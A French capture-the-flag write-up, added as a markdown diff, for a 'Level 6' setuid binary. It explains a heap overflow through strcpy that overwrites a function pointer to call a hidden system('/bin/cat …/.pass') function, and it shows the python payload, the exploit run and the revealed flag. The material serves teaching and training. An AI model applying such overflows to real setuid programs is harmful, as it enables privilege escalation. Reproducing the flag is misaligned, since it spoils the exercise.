@@ -1,0 +1,41 @@
+# Level 6
+## Résumé
+Buffer overflow sur la heap => écrase `m`, pointeur de fonction => appel la fonction `n` => `system(/bin/cat...`
+## Préambule
+```sh
+$> ls -l
+total 8
+-rwsr-s---+ 1 level7 users 5274 Mar  6  2016 level6
+$> file level6
+level6: setuid setgid ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=0xb1a5ce594393de0f273c64753cede6da01744479, not stripped
+```
+Le home contient un binaire appartenant à l'user `level7` et avec un `suid`. On doit donc exploiter ce binaire pour pouvoir accéder au fichier `/home/user/level7/.pass`.
+
+On récupère le fichier `level6` sur la VM pour le désassembler avec `radare2` :
+```sh
+$> scp -P 4242 level6@10.11.200.192:/home/user/level6/level6 .
+$> r2 level6
+```
+![level6_disassembled](Ressources/level6_disassembled.png)
+
+## Analyse
+### Analyse du programme
+La fonction `main` alloue sur la `heap` une zone mémoire de 64 et une zone mémoire de 4.  
+La première zone servira de destination pour `strcpy` qui copiera `argv[1]`. La deuxième zone servira pour stocker l'adresse de la fonction `m`, utilisé par un pointeur de fonction.
+
+La fonction `m` affiche un message à l'aide de la fonction `puts` puis quitte.
+
+On voit également qu'il existe la fonction `n` qui n'est pas utilisée. Or cette fonction fait un appel à `system(/bin/cat /home/user/level7/.pass)`. On en déduit que l'on doit faire pointer le pointeur de fonction vers cette fonction à l'aide d'un dépassement de mémoire lors de l'appel à `strcpy`.
+### Mise en place de l'exploitation
+Le `man 3 posix_memalign` nous indique que `malloc` est aligné sur 8 bits. De plus malloc ajoute en en-tête un size_t de la place totale réservée, size_t + payload. Le dernier bit étant un flag, il faut faire un mask pour avoir la valeur réelle. Enfin, la taille minimal réservée par `malloc` est de 16 bytes (https://sourceware.org/glibc/wiki/MallocInternals).  
+Par example, `malloc(64) -> 0x0804a008`. À l'adresse `0x0804a004` se trouve la taille totale réservée, ici `64+4(size_t)=68+4(align)=72 octets`.
+
+Pour écrire dans la zone réservé suivante (le pointeur de fonction), nous devons donc écrire `64+8 octets` :
+```sh
+python -c 'print("A"*(64+8)+"\x54\x84\x04\x08")'
+```
+## Application
+```sh
+$> ./level6 `python -c 'print("A"*(64+8)+"\x54\x84\x04\x08")'`
+f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d
+```
